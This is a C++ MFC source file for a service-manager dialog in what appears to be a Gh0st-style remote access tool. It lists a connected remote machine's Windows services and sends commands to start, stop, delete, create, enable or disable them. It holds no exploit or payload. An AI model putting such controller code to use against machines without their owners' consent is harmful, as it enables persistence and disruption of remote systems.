// CServerManager.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CServerManager.h"
#include "afxdialogex.h"
#include "../../common/macros.h"
#include"CSerValue.h"
#include"CCreateServerDlg.h"
#include"Sortthelist.h"
// CServerManager 对话框


enum
{
	COMMAND_STARTSERVERICE,			// 启动服务
	COMMAND_STOPSERVERICE,			// 停止服务
	COMMAND_DELETESERVERICE,		// 删除服务
	COMMAND_CREATSERVERICE,			// 创建服务
	COMMAND_AUTOSERVERICE,			// 自启动
	COMMAND_HANDSERVERICE,			// 手动
	COMMAND_DISABLESERVERICE		// 禁止
};

IMPLEMENT_DYNAMIC(CServerManager, CDialog)

CServerManager::CServerManager(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_SERVERDLG, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
}

CServerManager::~CServerManager()
{

}

void CServerManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_SERVERLIST, m_server);
}


BEGIN_MESSAGE_MAP(CServerManager, CDialog)
	ON_NOTIFY(NM_RCLICK, IDC_SERVERLIST, &CServerManager::OnNMRClickServerlist)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_DBLCLK, IDC_SERVERLIST, &CServerManager::OnNMDblclkServerlist)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_SERVERLIST, &CServerManager::OnLvnColumnclickServerlist)
	ON_COMMAND(ID_SERVER_32796, &CServerManager::OnServerStart)
	ON_COMMAND(ID_SERVER_32797, &CServerManager::OnServerStop)
	ON_COMMAND(ID_SERVER_32798, &CServerManager::OnServerDel)
	ON_COMMAND(ID_SERVER_32803, &CServerManager::OnServerGet)
	ON_COMMAND(ID_32800, &CServerManager::OnServerSetShoudong)
	ON_COMMAND(ID_32801, &CServerManager::OnServerAuto)
	ON_COMMAND(ID_32802, &CServerManager::OnServerClose)
	ON_COMMAND(ID_SERVER_32804, &CServerManager::OnServerCreate)
END_MESSAGE_MAP()



void CServerManager::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SSLIST:
		ShowServiceList();
		break;
	default:
		break;
	}
}

/// <summary>
/// 鼠标右键
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CServerManager::OnNMRClickServerlist(NMHDR* pNMHDR, LRESULT* pResult)
{
	CMenu	popup;
	popup.LoadMenu(IDR_SERVERLIST);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}


BOOL CServerManager::OnInitDialog()
{
	CDialog::OnInitDialog();
	
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 服务管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	
	m_server.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT |  LVS_EX_GRIDLINES);
	m_server.InsertColumn(0, "显示名称", LVCFMT_LEFT, 220);
	m_server.InsertColumn(1, "描述", LVCFMT_LEFT, 360);
	m_server.InsertColumn(2, "服务名称", LVCFMT_LEFT, 100);
	m_server.InsertColumn(3, "类型", LVCFMT_LEFT, 60);
	m_server.InsertColumn(4, "状态", LVCFMT_LEFT, 60);
	m_server.InsertColumn(5, "文件路径", LVCFMT_LEFT, 300);

	AdjustList();

	ShowServiceList();

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CServerManager::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	if (!m_server.GetSafeHwnd())
		return;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;
	m_server.MoveWindow(&rectList);

}

/// <summary>
/// 显示服务列表数据
/// </summary>
void CServerManager::ShowServiceList()
{

	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char* DisplayName;
	char* Description;
	char* ServiceName;
	char* StartType;
	char* ServiceState;
	char* BinaryPathName;
	DWORD	dwOffset = 0;
	m_server.DeleteAllItems();

	char stmk;
	Sleep(100);
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		DisplayName = lpBuffer + dwOffset;
		Description = DisplayName + lstrlen(DisplayName) + 1;
		ServiceName = Description + lstrlen(Description) + 1;
		StartType = ServiceName + lstrlen(ServiceName) + 1;
		ServiceState = StartType + lstrlen(StartType) + 1;
		BinaryPathName = ServiceState + lstrlen(ServiceState) + 1;

		if (!strcmp(StartType, "禁用"))
			stmk = 1;
		else if (!strcmp(ServiceState, "启动"))
			stmk = 0;
		else
			stmk = 2;

		m_server.InsertItem(i, DisplayName, stmk);
		m_server.SetItemText(i, 1, Description);
		m_server.SetItemText(i, 2, ServiceName);
		m_server.SetItemText(i, 3, StartType);
		m_server.SetItemText(i, 4, ServiceState);
		m_server.SetItemText(i, 5, BinaryPathName);

		dwOffset += lstrlen(DisplayName) + 1 +
			lstrlen(Description) + 1 +
			lstrlen(ServiceName) + 1 +
			lstrlen(StartType) + 1 +
			lstrlen(ServiceState) + 1 +
			lstrlen(BinaryPathName) + 1;
	}
	
}

/// <summary>
/// 获取列表数据
/// </summary>
void CServerManager::GetServiceList()
{
	BYTE bToken = COMMAND_SSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CServerManager::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	AdjustList();
	// TODO: 在此处添加消息处理程序代码
}


BOOL CServerManager::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}


void CServerManager::OnClose()
{
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
}

/// <summary>
/// 双击左键
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CServerManager::OnNMDblclkServerlist(NMHDR* pNMHDR, LRESULT* pResult)
{
	CSerValue SerAttribute(this, &m_server);
	SerAttribute.DoModal();
	*pResult = 0;
}

extern int strsort_column;	// 记录点击的列


/// <summary>
/// 点击表头排序
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CServerManager::OnLvnColumnclickServerlist(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	strsort_column = pNMLV->iSubItem;//点击的列
	int count = m_server.GetItemCount();
	for (int i = 0; i < count; i++)
		m_server.SetItemData(i, i); // 每行的比较关键字，此处为列序号（点击的列号），可以设置为其他 比较函数的第一二个参数

	m_server.SortItems(CompareListStrProc, (DWORD_PTR)&m_server);//排序 第二个参数是比较函数的第三个参数

	*pResult = 0;
}


void CServerManager::OnServerStart()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_STARTSERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);

	LocalFree(lpBuffer);
}


void CServerManager::OnServerStop()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_STOPSERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);

	LocalFree(lpBuffer);
}


void CServerManager::OnServerDel()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_DELETESERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);

	LocalFree(lpBuffer);
}


void CServerManager::OnServerGet()
{
	GetServiceList();
}


void CServerManager::OnServerSetShoudong()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_HANDSERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);

	LocalFree(lpBuffer);
}


void CServerManager::OnServerAuto()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_AUTOSERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);

	LocalFree(lpBuffer);
}


void CServerManager::OnServerClose()
{
	CString		tSerName;
	char		sername[300] = "\0";

	int		nItem = m_server.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_server.GetItemText(nItem, 2);
	ZeroMemory(sername, sizeof(sername));
	strcat(sername, tSerName);

	int nPacketLength = (strlen(sername) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_DISABLESERVERICE;

	memcpy(lpBuffer + 1, &sername, strlen(sername));

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);

	LocalFree(lpBuffer);
}


void CServerManager::OnServerCreate()
{
	CCreateServerDlg* dlg = new CCreateServerDlg(this);
	DWORD len = 0;
	DWORD offset = 0;
	if (IDOK == dlg->DoModal())
	{
		//判断三个框都不为空继续执行
		if (!dlg->m_serName.IsEmpty() && !dlg->m_serPath.IsEmpty() && !dlg->m_serShowName.IsEmpty())
		{
			//计算字符串长度
			len = strlen(dlg->m_serName.GetBuffer()) + strlen(dlg->m_serPath.GetBuffer()) + strlen(dlg->m_serShowName.GetBuffer()) + 4;

			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, len);

			if (lpBuffer)
			{
				lpBuffer[0] = COMMAND_CREATSERVERICE;
				offset++;

				memcpy(lpBuffer + offset, dlg->m_serName.GetBuffer(), strlen(dlg->m_serName.GetBuffer()));
				offset += strlen(dlg->m_serName.GetBuffer());
				lpBuffer[offset] = 0;
				offset++;

				memcpy(lpBuffer + offset, dlg->m_serShowName.GetBuffer(), strlen(dlg->m_serShowName.GetBuffer()));
				offset += strlen(dlg->m_serShowName.GetBuffer());
				lpBuffer[offset] = 0;
				offset++;

				memcpy(lpBuffer + offset, dlg->m_serPath.GetBuffer(), strlen(dlg->m_serPath.GetBuffer()));
				offset += strlen(dlg->m_serPath.GetBuffer());
				lpBuffer[offset] = 0;
				offset++;
				m_iocpServer->Send(m_pContext, lpBuffer, len);

				LocalFree(lpBuffer);
			}

		}
	}

	delete dlg;
}
